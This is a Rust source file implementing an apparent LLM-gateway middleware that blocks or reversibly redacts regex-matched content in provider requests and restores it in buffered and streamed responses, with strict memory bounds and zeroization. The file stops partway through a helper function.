//! Deterministic, request-lifetime content redaction middleware.
//!
//! Configured matches become namespace-keyed tokens before provider dispatch.
//! The token is stable across requests, while the original value lives only in
//! opaque state owned by this request's response lifetime. Buffered responses
//! and decoded stream events restore exact matches without process-wide or
//! session-wide mapping state.

use std::{
    collections::BTreeMap,
    io::{self, Write as _},
};

use base64::{Engine as _, engine::general_purpose::URL_SAFE_NO_PAD};
use regex::Regex;
use regex_syntax::hir::{Hir, HirKind};
use ring::hmac;
use secrecy::zeroize::Zeroize;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use thiserror::Error;

use crate::{
    Middleware, MiddlewareDeclaration, MiddlewareError, MiddlewareFailurePosture,
    MiddlewareOutcome, MiddlewarePhase, MiddlewareRefusal, MiddlewareResult, MiddlewareState,
    MiddlewareSurface, ProviderStreamEvent,
};

const TOKEN_PREFIX: &str = "[AXOND:";
const TOKEN_SUFFIX: &str = "]";
const TOKEN_DIGEST_BYTES: usize = 16;
const TOKEN_DIGEST_TEXT_BYTES: usize = 22;
const TOKEN_BYTES: usize = TOKEN_PREFIX.len() + TOKEN_DIGEST_TEXT_BYTES + TOKEN_SUFFIX.len();
/// A whole transformed request is byte-bounded, but a short distinct match can
/// otherwise amplify into one tree allocation and one retained original. Four
/// thousand distinct values is deliberately generous for content redaction yet
/// keeps request-lifetime metadata to a small, predictable fraction of the
/// 64 MiB standalone body ceiling. Repeated occurrences of one value share an
/// entry and do not consume this cardinality budget.
const MAX_DISTINCT_REDACTIONS: usize = 4_096;
/// Carry values are individually shorter than one 30-byte token, but semantic
/// channel/path keys also consume metadata. Bound their cardinality separately
/// so a provider cannot turn many one-byte partial-token channels into an
/// unbounded response-lifetime map beneath the rendered-stream byte ceiling.
const MAX_STREAM_CARRIES: usize = 4_096;
/// Carry keys retain provider-controlled semantic identities for the response
/// lifetime. Cap their aggregate logical/structural footprint as well as their
/// count so a stream of long Responses item IDs cannot grow state without
/// bound beneath the event-size limit.
const MAX_STREAM_CARRY_KEY_BYTES: usize = 1024 * 1024;
/// Every carry is a strict prefix of one concrete 30-byte request token, but a
/// provider can create many independent channels. Keep their aggregate value
/// bytes independently bounded instead of relying only on cardinality.
const MAX_STREAM_CARRY_VALUE_BYTES: usize = 64 * 1024;
/// Axond projects a fixed, tiny set of immutable provider controls (currently
/// protocol headers plus an optional previous-response id). Bound the generic
/// core hook so per-channel cross-boundary projections remain a fixed multiple
/// of request size even for another host implementation.
const MAX_PROTECTED_REQUEST_VALUES: usize = 8;
const MAX_PROTECTED_REQUEST_VALUE_BYTES: usize = 64 * 1024;
/// Core can be embedded without Axond's admission configuration. Keep request
/// masking finite in that case; the gateway supplies its exact whole-request
/// ceiling through [`DeterministicGuardrail::compile_with_request_limit`].
const MAX_MASKED_REQUEST_BYTES: usize = 64 * 1024 * 1024;
/// A provider response is already transport-bounded, but replacing one short
/// token with caller input can expand it. Keep core's allocation ceiling finite
/// even when it is invoked outside the gateway; the gateway applies its exact
/// configured whole-response/whole-stream byte budget after serialization.
const MAX_RESTORED_TEXT_BYTES: usize = 64 * 1024 * 1024;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum GuardrailAction {
    Block,
    Redact,
}

/// One ordered content rule selected by a typed policy registration.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct GuardrailRule {
    pub id: String,
    pub pattern: String,
    pub action: GuardrailAction,
}

#[derive(Debug, Error)]
pub enum GuardrailCompileError {
    #[error("at least one guardrail rule is required")]
    NoRules,
    #[error("deterministic redaction must use a fail-closed middleware declaration")]
    RequiresFailClosed,
    #[error("guardrail rule `{id}` has an invalid regex: {detail}")]
    InvalidRegex { id: String, detail: String },
    #[error("guardrail rule `{0}` may match an empty value")]
    EmptyMatch(String),
    #[error("deterministic redaction request limit must be at least one byte")]
    ZeroRequestLimit,
}

struct CompiledRule {
    regex: Regex,
    action: GuardrailAction,
}

/// A deterministic guardrail whose reversible values never leave one request.
pub struct DeterministicGuardrail {
    declaration: MiddlewareDeclaration,
    key: hmac::Key,
    rules: Vec<CompiledRule>,
    /// One leftmost-first alternation in policy order. The regex engine scans a
    /// text once, so frequent matches cannot repeatedly rescan every remaining
    /// rule suffix. Alternation order is exactly the old same-offset tie-break.
    redaction: Option<Regex>,
    max_request_bytes: usize,
}

impl DeterministicGuardrail {
    pub fn compile(
        declaration: MiddlewareDeclaration,
        namespace_key: &[u8; 32],
        rules: &[GuardrailRule],
    ) -> Result<Self, GuardrailCompileError> {
        Self::compile_with_request_limit(
            declaration,
            namespace_key,
            rules,
            MAX_MASKED_REQUEST_BYTES,
        )
    }

    /// Compile with the exact serialized whole-request ceiling enforced by the
    /// host. Masking preflights the complete transformed JSON body against this
    /// bound before cloning or allocating an expanded string.
    pub fn compile_with_request_limit(
        declaration: MiddlewareDeclaration,
        namespace_key: &[u8; 32],
        rules: &[GuardrailRule],
        max_request_bytes: usize,
    ) -> Result<Self, GuardrailCompileError> {
        if declaration.failure_posture != MiddlewareFailurePosture::FailClosed {
            return Err(GuardrailCompileError::RequiresFailClosed);
        }
        if rules.is_empty() {
            return Err(GuardrailCompileError::NoRules);
        }
        if max_request_bytes == 0 {
            return Err(GuardrailCompileError::ZeroRequestLimit);
        }
        let mut compiled_rules = Vec::with_capacity(rules.len());
        let mut redaction_hirs = Vec::new();
        let mut first_redaction_id = None;
        for rule in rules {
            let hir = regex_syntax::Parser::new()
                .parse(&rule.pattern)
                .map_err(|source| GuardrailCompileError::InvalidRegex {
                    id: rule.id.clone(),
                    detail: source.to_string(),
                })?;
            if hir.properties().minimum_len() == Some(0) {
                return Err(GuardrailCompileError::EmptyMatch(rule.id.clone()));
            }
            let regex = Regex::new(&rule.pattern).map_err(|source| {
                GuardrailCompileError::InvalidRegex {
                    id: rule.id.clone(),
                    detail: source.to_string(),
                }
            })?;
            if rule.action == GuardrailAction::Redact {
                first_redaction_id.get_or_insert_with(|| rule.id.clone());
                // Captures cannot affect Rust regex matching (backreferences and
                // conditionals are unsupported), so remove them before merging.
                // This also lets independently valid rules reuse capture names.
                redaction_hirs.push(without_captures(&hir));
            }
            compiled_rules.push(CompiledRule {
                regex,
                action: rule.action,
            });
        }
        let redaction = if redaction_hirs.is_empty() {
            None
        } else {
            // Keep explicit non-capturing branches instead of asking HIR's
            // smart alternation constructor to combine classes or factor
            // prefixes: branch order is the policy's tie-break contract.
            let merged = redaction_hirs
                .iter()
                .map(|hir| format!("(?:{hir})"))
                .collect::<Vec<_>>()
                .join("|");
            Some(
                Regex::new(&merged).map_err(|source| GuardrailCompileError::InvalidRegex {
                    id: first_redaction_id.expect("a merged redaction has an id"),
                    detail: format!("ordered redaction matcher: {source}"),
                })?,
            )
        };
        Ok(Self {
            declaration,
            key: hmac::Key::new(hmac::HMAC_SHA256, namespace_key),
            rules: compiled_rules,
            redaction,
            max_request_bytes,
        })
    }

    fn inspect_request(&self, surface: MiddlewareSurface, body: &mut Value) -> MiddlewareResult {
        if malformed_routing_controls(body) {
            return Ok(MiddlewareOutcome::refuse(MiddlewareRefusal::InvalidRequest));
        }

        // Keys, protocol controls, and text split across structural fragments
        // cannot be safely rewritten. A match in any such channel refuses the
        // whole request before mutation, for both block and redaction rules.
        if has_unredactable_match(
            surface,
            body,
            &self.rules,
            true,
            &mut Vec::new(),
            &mut Vec::new(),
        ) || complete_provider_wire_sequence_has_match(body, &self.rules)
            || complete_provider_text_sequence_has_match(surface, body, &self.rules)
        {
            return Ok(MiddlewareOutcome::refuse(MiddlewareRefusal::Policy));
        }

        // Blocking is evaluated against the untouched request. A refusal has a
        // bounded typed reason, no request-local state, and no echoed match.
        if self
            .rules
            .iter()
            .filter(|rule| rule.action == GuardrailAction::Block)
            .any(|rule| any_matching_value(body, &rule.regex, true))
        {
            return Ok(MiddlewareOutcome::refuse(MiddlewareRefusal::Policy));
        }

        let masked_bytes = masked_request_serialized_len(surface, body, self.redaction.as_ref())?;
        if masked_bytes > self.max_request_bytes {
            return Err(MiddlewareError::Failed);
        }

        // Make request masking atomic. A runtime regex/collision failure cannot
        // leave a partly redacted request available for provider dispatch.
        let mut masked = body.clone();
        let mut state = RedactionState::default();
        let mask_context = MaskContext {
            surface,
            redaction: self.redaction.as_ref(),
            key: &self.key,
        };
        mask_value(
            &mask_context,
            &mut masked,
            &mut state,
            true,
            &mut Vec::new(),
            &mut Vec::new(),
        )?;
        *body = masked;
        Ok(MiddlewareOutcome::continue_with_state(
            MiddlewareState::new(state),
        ))
    }
}

/// Rebuild a pattern without capture bookkeeping before it enters the ordered
/// alternation. Rust regexes do not support constructs whose match semantics
/// depend on captured text, so this preserves every accepted language while
/// avoiding duplicate capture-name conflicts between otherwise independent
/// policy rules.
fn without_captures(hir: &Hir) -> Hir {
    match hir.kind() {
        HirKind::Empty => Hir::empty(),
        HirKind::Literal(literal) => Hir::literal(literal.0.clone()),
        HirKind::Class(class) => Hir::class(class.clone()),
        HirKind::Look(look) => Hir::look(*look),
        HirKind::Repetition(repetition) => {
            Hir::repetition(repetition.with(without_captures(&repetition.sub)))
        }
        HirKind::Capture(capture) => without_captures(&capture.sub),
        HirKind::Concat(parts) => Hir::concat(parts.iter().map(without_captures).collect()),
        HirKind::Alternation(parts) => {
            Hir::alternation(parts.iter().map(without_captures).collect())
        }
    }
}

fn malformed_routing_controls(body: &Value) -> bool {
    let Some(fields) = body.as_object() else {
        return true;
    };
    fields
        .get("stream")
        .is_some_and(|value| !value.is_boolean())
        || fields
            .get("previous_response_id")
            .is_some_and(|value| !value.is_null() && !value.is_string())
}

impl Middleware for DeterministicGuardrail {
    fn declaration(&self) -> &MiddlewareDeclaration {
        &self.declaration
    }

    fn inspect_protected_request_values(
        &self,
        values: &[(String, String)],
    ) -> Result<Option<MiddlewareRefusal>, MiddlewareError> {
        let retained_bytes = values.iter().try_fold(0_usize, |bytes, (name, value)| {
            bytes
                .checked_add(name.len())
                .and_then(|bytes| bytes.checked_add(value.len()))
        });
        if values.len() > MAX_PROTECTED_REQUEST_VALUES
            || retained_bytes.is_none_or(|bytes| bytes > MAX_PROTECTED_REQUEST_VALUE_BYTES)
        {
            return Err(MiddlewareError::Failed);
        }
        Ok(values
            .iter()
            .any(|(name, value)| {
                self.rules
                    .iter()
                    .any(|rule| rule.regex.is_match(name) || rule.regex.is_match(value))
            })
            .then_some(MiddlewareRefusal::Policy))
    }

    fn inspect_protected_request(
        &self,
        surface: Option<MiddlewareSurface>,
        request: &crate::ProviderRequest,
        values: &[(String, String)],
    ) -> Result<Option<MiddlewareRefusal>, MiddlewareError> {
        if self.inspect_protected_request_values(values)?.is_some() {
            return Ok(Some(MiddlewareRefusal::Policy));
        }

        let protected_wire = values
            .iter()
            .flat_map(|(name, value)| [name.as_str(), value.as_str()])
            .collect::<Vec<_>>();
        let protected_values = values
            .iter()
            .map(|(_, value)| value.as_str())
            .collect::<Vec<_>>();
        let mut body_wire = Vec::new();
        let mut body_values = Vec::new();
        collect_provider_wire_fragments(
            &request.body,
            true,
            true,
            &mut body_wire,
            &mut body_values,
        );
        let semantic_body = surface
            .map(|surface| provider_text_sequence(surface, &request.body, false))
            .unwrap_or_default();
        let semantic_body_with_media_locators = surface
            .map(|surface| provider_text_sequence(surface, &request.body, true))
            .unwrap_or_default();
        if fragment_sequence_has_cross_boundary_match_in_both_directions(
            &protected_wire,
            &self.rules,
        )
            || fragment_sequence_has_cross_boundary_match_in_both_directions(
                &protected_values,
                &self.rules,
            )
            // Compare complete canonical sequences instead of materializing
            // every protected/body pair. This catches arbitrary multi-fragment
            // partitions in either wire order with work linear in retained
            // request text for each fixed sequence projection.
            || fragment_sequences_have_cross_boundary_match(
                &protected_wire,
                &body_wire,
                &self.rules,
            )
            || fragment_sequences_have_cross_boundary_match(
                &protected_wire,
                &body_values,
                &self.rules,
            )
            || fragment_sequences_have_cross_boundary_match(
                &protected_values,
                &body_wire,
                &self.rules,
            )
            || fragment_sequences_have_cross_boundary_match(
                &protected_values,
                &body_values,
                &self.rules,
            )
            || fragment_sequences_have_cross_boundary_match(
                &protected_wire,
                &semantic_body,
                &self.rules,
            )
            || fragment_sequences_have_cross_boundary_match(
                &protected_values,
                &semantic_body,
                &self.rules,
            )
            || fragment_sequences_have_cross_boundary_match(
                &protected_wire,
                &semantic_body_with_media_locators,
                &self.rules,
            )
            || fragment_sequences_have_cross_boundary_match(
                &protected_values,
                &semantic_body_with_media_locators,
                &self.rules,
            )
            || protected_fragments_have_cross_boundary_match(
                &protected_wire,
                &body_wire,
                &self.rules,
            )
            || protected_fragments_have_cross_boundary_match(
                &protected_wire,
                &body_values,
                &self.rules,
            )
            || protected_fragments_have_cross_boundary_match(
                &protected_values,
                &semantic_body,
                &self.rules,
            )
            || protected_fragments_have_cross_boundary_match(
                &protected_values,
                &semantic_body_with_media_locators,
                &self.rules,
            )
        {
            Ok(Some(MiddlewareRefusal::Policy))
        } else {
            Ok(None)
        }
    }

    fn apply(
        &self,
        phase: MiddlewarePhase<'_>,
        state: Option<&mut MiddlewareState>,
    ) -> MiddlewareResult {
        #[cfg(test)]
        {
            // Core unit tests use the Chat shape unless they explicitly invoke
            // `apply_for_surface` to exercise another gateway-selected route.
            self.apply_for_surface(Some(MiddlewareSurface::ChatCompletions), phase, state)
        }
        #[cfg(not(test))]
        {
            let _ = (phase, state);
            // Declassification must be bound to a gateway-selected surface.
            // The unscoped compatibility entry point cannot safely infer one
            // from JSON.
            Err(MiddlewareError::Failed)
        }
    }

    fn apply_for_surface(
        &self,
        surface: Option<MiddlewareSurface>,
        phase: MiddlewarePhase<'_>,
        state: Option<&mut MiddlewareState>,
    ) -> MiddlewareResult {
        let surface = surface.ok_or(MiddlewareError::Failed)?;
        match phase {
            MiddlewarePhase::Request(request) => self.inspect_request(surface, &mut request.body),
            MiddlewarePhase::Response(response) => {
                let state = redaction_state(state)?;
                if state.originals.is_empty() {
                    return Ok(MiddlewareOutcome::continue_without_state());
                }
                let mut restored = response.body.clone();
                restore_value(
                    surface,
                    &mut restored,
                    &mut Vec::new(),
                    &mut Vec::new(),
                    &state.originals,
                    &mut RestoreBudget::new(MAX_RESTORED_TEXT_BYTES),
                )?;
                response.body = restored;
                Ok(MiddlewareOutcome::continue_without_state())
            }
            MiddlewarePhase::StreamEvent(ProviderStreamEvent::Data { event, data }) => {
                let state = redaction_state(state)?;
                if state.originals.is_empty() {
                    return Ok(MiddlewareOutcome::continue_without_state());
                }
                let channels = StreamChannels::from_event(surface, event.as_deref(), data)?;
                let mut restored = data.clone();
                let mut carry = StreamCarryTransaction::new(
                    &mut state.stream_carry,
                    &mut state.stream_carry_key_bytes,
                    &mut state.stream_carry_value_bytes,
                );
                let restore_context = StreamRestoreContext {
                    event: event.as_deref(),
                    channels: &channels,
                    originals: &state.originals,
                };
                restore_stream_value(
                    &mut restored,
                    &mut Vec::new(),
                    &mut Vec::new(),
                    &restore_context,
                    &mut carry,
                    &mut RestoreBudget::new(MAX_RESTORED_TEXT_BYTES),
                )?;
                *data = restored;
                carry.commit();
                Ok(MiddlewareOutcome::continue_without_state())
            }
            // Terminal usage is not middleware payload. The gateway invokes
            // finish_stream only after semantic completion and strict EOF.
            MiddlewarePhase::StreamEvent(ProviderStreamEvent::Done(_)) => {
                Ok(MiddlewareOutcome::continue_without_state())
            }
        }
    }

    fn finish_stream(&self, state: Option<&mut MiddlewareState>) -> Result<(), MiddlewareError> {
        let state = redaction_state(state)?;
        if state
            .stream_carry
            .values()
            .any(|carry| strict_prefix_of_concrete_token(carry, &state.originals))
        {
            // Never flush an incomplete request token. Keeping the carry intact
            // also makes repeated/error-path finalization fail closed.
            Err(MiddlewareError::Failed)
        } else {
            Ok(())
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
enum StreamPathSegment {
    ObjectKey(String),
    ArrayIndex(usize),
}

type StreamPath = Vec<StreamPathSegment>;

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct StreamCarryKey {
    channel: String,
    path: StreamPath,
}

impl StreamCarryKey {
    fn retained_bytes(&self) -> Result<usize, MiddlewareError> {
        self.path.iter().try_fold(
            std::mem::size_of::<Self>()
                .checked_add(
                    self.path
                        .len()
                        .checked_mul(std::mem::size_of::<StreamPathSegment>())
                        .ok_or(MiddlewareError::Failed)?,
                )
                .and_then(|bytes| bytes.checked_add(self.channel.len()))
                .ok_or(MiddlewareError::Failed)?,
            |bytes, segment| {
                bytes
                    .checked_add(match segment {
                        StreamPathSegment::ObjectKey(key) => key.len(),
                        StreamPathSegment::ArrayIndex(_) => 0,
                    })
                    .ok_or(MiddlewareError::Failed)
            },
        )
    }
}

struct StreamChannels {
    surface: MiddlewareSurface,
    chat_choices: BTreeMap<usize, String>,
    event: Option<String>,
    response_outputs: BTreeMap<usize, String>,
}

impl StreamChannels {
    fn from_event(
        surface: MiddlewareSurface,
        event: Option<&str>,
        data: &Value,
    ) -> Result<Self, MiddlewareError> {
        let mut channels = Self {
            surface,
            chat_choices: BTreeMap::new(),
            event: None,
            response_outputs: BTreeMap::new(),
        };
        match surface {
            MiddlewareSurface::ChatCompletions => {
                if let Some(choices) = data.get("choices").and_then(Value::as_array) {
                    let mut identities = BTreeMap::new();
                    for (position, choice) in choices.iter().enumerate() {
                        let Some(index) = choice.get("index").and_then(Value::as_u64) else {
                            continue;
                        };
                        let identity = format!("chat-choice:{index}");
                        if identities.insert(identity.clone(), position).is_some() {
                            return Err(MiddlewareError::Failed);
                        }
                        channels.chat_choices.insert(position, identity);
                    }
                }
            }
            MiddlewareSurface::NativeMessages if event == Some("content_block_delta") => {
                if let Some(index) = data.get("index").and_then(Value::as_u64) {
                    channels.event = Some(format!("native-content-block:{index}"));
                }
            }
            MiddlewareSurface::Responses
                if matches!(
                    event,
                    Some("response.output_text.delta") | Some("response.output_text.done")
                ) =>
            {
                let item = data.get("item_id").and_then(Value::as_str);
                let output = data.get("output_index").and_then(Value::as_u64);
                let content = data.get("content_index").and_then(Value::as_u64);
                if let (Some(item), Some(output), Some(content)) = (item, output, content) {
                    channels.event = Some(format!(
                        "responses-item:{item}:output:{output}:content:{content}"
                    ));
                }
            }
            MiddlewareSurface::Responses if event == Some("response.completed") => {
                if let Some(outputs) = data.pointer("/response/output").and_then(Value::as_array) {
                    let mut identities = BTreeMap::new();
                    for (position, output) in outputs.iter().enumerate() {
                        let Some(id) = output.get("id").and_then(Value::as_str) else {
                            continue;
                        };
                        let identity = format!("responses-completed-output:{id}");
                        if identities.insert(identity.clone(), position).is_some() {
                            return Err(MiddlewareError::Failed);
                        }
                        channels.response_outputs.insert(position, identity);
                    }
                }
            }
            _ => {}
        }
        Ok(channels)
    }

    fn channel_for(&self, path: &[StreamPathSegment], event: Option<&str>) -> Option<String> {
        match path {
            [a, StreamPathSegment::ArrayIndex(position), ..] if key_is(a, "choices") => {
                self.chat_choices.get(position).cloned()
            }
            [
                r,
                o,
                StreamPathSegment::ArrayIndex(output),
                c,
                StreamPathSegment::ArrayIndex(content),
                ..,
            ] if event == Some("response.completed")
                && key_is(r, "response")
                && key_is(o, "output")
                && key_is(c, "content") =>
            {
                self.response_outputs
                    .get(output)
                    .map(|identity| format!("{identity}:content:{content}"))
            }
            _ => self.event.clone(),
        }
    }

    fn stable_path_for(&self, path: &[StreamPathSegment], event: Option<&str>) -> StreamPath {
        let mut stable = path.to_vec();
        match (self.surface, path) {
            // The provider's choice index is the identity. Array position may
            // change from event to event and must not split one choice's carry.
            (MiddlewareSurface::ChatCompletions, [a, StreamPathSegment::ArrayIndex(_), ..])
                if key_is(a, "choices") =>
            {
                stable[1] = StreamPathSegment::ArrayIndex(0);
            }
            // response.completed output identity and content position are
            // already encoded into the semantic channel.
            (
                MiddlewareSurface::Responses,
                [
                    r,
                    o,
                    StreamPathSegment::ArrayIndex(_),
                    c,
                    StreamPathSegment::ArrayIndex(_),
                    ..,
                ],
            ) if event == Some("response.completed")
                && key_is(r, "response")
                && key_is(o, "output")
                && key_is(c, "content") =>
            {
                stable[2] = StreamPathSegment::ArrayIndex(0);
                stable[4] = StreamPathSegment::ArrayIndex(0);
            }
            _ => {}
        }
        stable
    }
}

#[derive(Default)]
struct RedactionState {
    originals: BTreeMap<String, String>,
    stream_carry: BTreeMap<StreamCarryKey, String>,
    stream_carry_key_bytes: usize,
    stream_carry_value_bytes: usize,
}

impl Drop for RedactionState {
    fn drop(&mut self) {
        for original in self.originals.values_mut() {
            original.zeroize();
        }
        for carry in self.stream_carry.values_mut() {
            carry.zeroize();
        }
    }
}

/// A per-event undo journal over response-lifetime carry state. Mutations are
/// visible to later fields in the same decoded event, while an error restores
/// every touched key and both aggregate counters. Only touched entries are
/// cloned, avoiding an O(total carry state) clone on every stream event.
struct StreamCarryTransaction<'a> {
    carries: &'a mut BTreeMap<StreamCarryKey, String>,
    key_bytes: &'a mut usize,
    value_bytes: &'a mut usize,
    initial_key_bytes: usize,
    initial_value_bytes: usize,
    undo: BTreeMap<StreamCarryKey, Option<String>>,
    committed: bool,
}

impl<'a> StreamCarryTransaction<'a> {
    fn new(
        carries: &'a mut BTreeMap<StreamCarryKey, String>,
        key_bytes: &'a mut usize,
        value_bytes: &'a mut usize,
    ) -> Self {
        let initial_key_bytes = *key_bytes;
        let initial_value_bytes = *value_bytes;
        Self {
            carries,
            initial_key_bytes,
            initial_value_bytes,
            key_bytes,
            value_bytes,
            undo: BTreeMap::new(),
            committed: false,
        }
    }

    fn get(&self, key: &StreamCarryKey) -> Option<&str> {
        self.carries.get(key).map(String::as_str)
    }

    fn remember(&mut self, key: &StreamCarryKey) {
        if !self.undo.contains_key(key) {
            self.undo
                .insert(key.clone(), self.carries.get(key).cloned());
        }
    }

    fn remove(&mut self, key: &StreamCarryKey) -> Result<(), MiddlewareError> {
        let Some(current) = self.carries.get(key) else {
            return Ok(());
        };
        let next_key_bytes = (*self.key_bytes)
            .checked_sub(key.retained_bytes()?)
            .ok_or(MiddlewareError::Failed)?;
        let next_value_bytes = (*self.value_bytes)
            .checked_sub(current.len())
            .ok_or(MiddlewareError::Failed)?;
        self.remember(key);
        let mut removed = self.carries.remove(key).ok_or(MiddlewareError::Failed)?;
        removed.zeroize();
        *self.key_bytes = next_key_bytes;
        *self.value_bytes = next_value_bytes;
        Ok(())
    }

    fn insert(&mut self, key: StreamCarryKey, value: String) -> Result<(), MiddlewareError> {
        let existing = self.carries.get(&key);
        if existing.is_none() && self.carries.len() >= MAX_STREAM_CARRIES {
            return Err(MiddlewareError::Failed);
        }
        let retained_key_bytes = key.retained_bytes()?;
        let next_key_bytes = if existing.is_some() {
            *self.key_bytes
        } else {
            (*self.key_bytes)
                .checked_add(retained_key_bytes)
                .ok_or(MiddlewareError::Failed)?
        };
        let next_value_bytes = (*self.value_bytes)
            .checked_sub(existing.map_or(0, |value| value.len()))
            .and_then(|bytes| bytes.checked_add(value.len()))
            .ok_or(MiddlewareError::Failed)?;
        if next_key_bytes > MAX_STREAM_CARRY_KEY_BYTES
            || next_value_bytes > MAX_STREAM_CARRY_VALUE_BYTES
        {
            return Err(MiddlewareError::Failed);
        }

        self.remember(&key);
        if let Some(mut replaced) = self.carries.insert(key, value) {
            replaced.zeroize();
        }
        *self.key_bytes = next_key_bytes;
        *self.value_bytes = next_value_bytes;
        Ok(())
    }

    fn commit(mut self) {
        for original in self.undo.values_mut().flatten() {
            original.zeroize();
        }
        self.undo.clear();
        self.committed = true;
    }

    fn rollback(&mut self) {
        for (key, original) in std::mem::take(&mut self.undo) {
            if let Some(mut current) = self.carries.remove(&key) {
                current.zeroize();
            }
            if let Some(original) = original {
                self.carries.insert(key, original);
            }
        }
        *self.key_bytes = self.initial_key_bytes;
        *self.value_bytes = self.initial_value_bytes;
    }
}

impl Drop for StreamCarryTransaction<'_> {
    fn drop(&mut self) {
        if !self.committed {
            self.rollback();
        }
    }
}

fn redaction_state(
    state: Option<&mut MiddlewareState>,
) -> Result<&mut RedactionState, MiddlewareError> {
    state
        .and_then(|state| state.downcast_mut::<RedactionState>())
        .ok_or(MiddlewareError::Failed)
}

fn has_unredactable_match(
    surface: MiddlewareSurface,
    value: &Value,
    rules: &[CompiledRule],
    root: bool,
    path: &mut StreamPath,
    type_stack: &mut Vec<Option<String>>,
) -> bool {
    match value {
        Value::Array(values) => {
            array_has_cross_fragment_match(values, rules)
                || values.iter().enumerate().any(|(index, value)| {
                    path.push(StreamPathSegment::ArrayIndex(index));
                    let matched =
                        has_unredactable_match(surface, value, rules, false, path, type_stack);
                    let _ = path.pop();
                    matched
                })
        }
        Value::Object(fields) => {
            let container_type = fields
                .get("type")
                .and_then(Value::as_str)
                .map(str::to_owned);
            type_stack.push(container_type);
            let matched = fields.iter().any(|(field, value)| {
                if rules.iter().any(|rule| rule.regex.is_match(field)) {
                    return true;
                }
                if root && field == "previous_response_id" {
                    return value
                        .as_str()
                        .is_some_and(|text| rules.iter().any(|rule| rule.regex.is_match(text)));
                }
                if root && protected_routing_field(field) {
                    return false;
                }
                path.push(StreamPathSegment::ObjectKey(field.clone()));
                let matched =
                    has_unredactable_match(surface, value, rules, false, path, type_stack);
                let _ = path.pop();
                matched
            });
            let _ = type_stack.pop();
            matched
        }
        Value::String(text) => {
            !redactable_request_text_path(surface, path, type_stack)
                && rules.iter().any(|rule| rule.regex.is_match(text))
        }
        Value::Null | Value::Bool(_) | Value::Number(_) => false,
    }
}

/// Direct redaction is limited to route-specific structural paths whose string
/// value is provider prompt content. Precheck and masking call this same
/// classifier, so a familiar leaf name under metadata or a future container is
/// never silently rewritten.
fn redactable_request_text_path(
    surface: MiddlewareSurface,
    path: &[StreamPathSegment],
    type_stack: &[Option<String>],
) -> bool {
    match surface {
        MiddlewareSurface::ChatCompletions => match path {
            [messages, StreamPathSegment::ArrayIndex(_), content]
                if key_is(messages, "messages") && key_is(content, "content") =>
            {
                true
            }
            [
                messages,
                StreamPathSegment::ArrayIndex(_),
                content,
                StreamPathSegment::ArrayIndex(_),
                text,
            ] if key_is(messages, "messages")
                && key_is(content, "content")
                && key_is(text, "text")
                && request_type_is(type_stack, "text") =>
            {
                true
            }
            [
                messages,
                StreamPathSegment::ArrayIndex(_),
                tool_calls,
                StreamPathSegment::ArrayIndex(_),
                function,
                arguments,
            ] if key_is(messages, "messages")
                && key_is(tool_calls, "tool_calls")
                && key_is(function, "function")
                && key_is(arguments, "arguments") =>
            {
                true
            }
            [
                tools,
                StreamPathSegment::ArrayIndex(_),
                function,
                description,
            ] if key_is(tools, "tools")
                && key_is(function, "function")
                && key_is(description, "description") =>
            {
                true
            }
            [functions, StreamPathSegment::ArrayIndex(_), description]
                if key_is(functions, "functions") && key_is(description, "description") =>
            {
                true
            }
            _ => chat_schema_description_path(path),
        },
        MiddlewareSurface::NativeMessages => match path {
            [system] if key_is(system, "system") => true,
            [system, StreamPathSegment::ArrayIndex(_), text]
                if key_is(system, "system")
                    && key_is(text, "text")
                    && request_type_is(type_stack, "text") =>
            {
                true
            }
            [messages, StreamPathSegment::ArrayIndex(_), content]
                if key_is(messages, "messages") && key_is(content, "content") =>
            {
                true
            }
            [
                messages,
                StreamPathSegment::ArrayIndex(_),
                content,
                StreamPathSegment::ArrayIndex(_),
                text,
            ] if key_is(messages, "messages")
                && key_is(content, "content")
                && key_is(text, "text")
                && request_type_is(type_stack, "text") =>
            {
                true
            }
            [
                messages,
                StreamPathSegment::ArrayIndex(_),
                content,
                StreamPathSegment::ArrayIndex(_),
                nested_content,
            ] if key_is(messages, "messages")
                && key_is(content, "content")
                && key_is(nested_content, "content")
                && request_type_is(type_stack, "tool_result") =>
            {
                true
            }
            [
                messages,
                StreamPathSegment::ArrayIndex(_),
                content,
                StreamPathSegment::ArrayIndex(_),
                nested_content,
                StreamPathSegment::ArrayIndex(_),
                text,
            ] if key_is(messages, "messages")
                && key_is(content, "content")
                && key_is(nested_content, "content")
                && key_is(text, "text")
                && request_type_suffix(type_stack, &["tool_result", "text"]) =>
            {
                true
            }
            [tools, StreamPathSegment::ArrayIndex(_), description]
                if key_is(tools, "tools") && key_is(description, "description") =>
            {
                true
            }
            _ => native_schema_description_path(path),
        },
        MiddlewareSurface::Responses => match path {
            [instructions] if key_is(instructions, "instructions") => true,
            [input] if key_is(input, "input") => true,
            [input, StreamPathSegment::ArrayIndex(_), content]
                if key_is(input, "input")
                    && key_is(content, "content")
                    && request_immediate_type_is_absent_or(type_stack, "message") =>
            {
                true
            }
            [
                input,
                StreamPathSegment::ArrayIndex(_),
                content,
                StreamPathSegment::ArrayIndex(_),
                text,
            ] if key_is(input, "input")
                && key_is(content, "content")
                && key_is(text, "text")
                && request_parent_type_is_absent_or(type_stack, "message")
                && request_immediate_type_is_one_of(type_stack, &["input_text", "text"]) =>
            {
                true
            }
            [input, StreamPathSegment::ArrayIndex(_), arguments]
                if key_is(input, "input")
                    && key_is(arguments, "arguments")
                    && request_type_is(type_stack, "function_call") =>
            {
                true
            }
            [input, StreamPathSegment::ArrayIndex(_), output]
                if key_is(input, "input")
                    && key_is(output, "output")
                    && request_type_is(type_stack, "function_call_output") =>
            {
                true
            }
            [tools, StreamPathSegment::ArrayIndex(_), description]
                if key_is(tools, "tools") && key_is(description, "description") =>
            {
                true
            }
            _ => responses_schema_description_path(path),
        },
        MiddlewareSurface::Embeddings => match path {
            [input] => key_is(input, "input"),
            [input, StreamPathSegment::ArrayIndex(_)] => key_is(input, "input"),
            _ => false,
        },
    }
}

fn chat_schema_description_path(path: &[StreamPathSegment]) -> bool {
    let Some(last) = path.last() else {
        return false;
    };
    key_is(last, "description")
        && ((path.len() >= 5
            && key_is(&path[0], "tools")
            && is_index(&path[1])
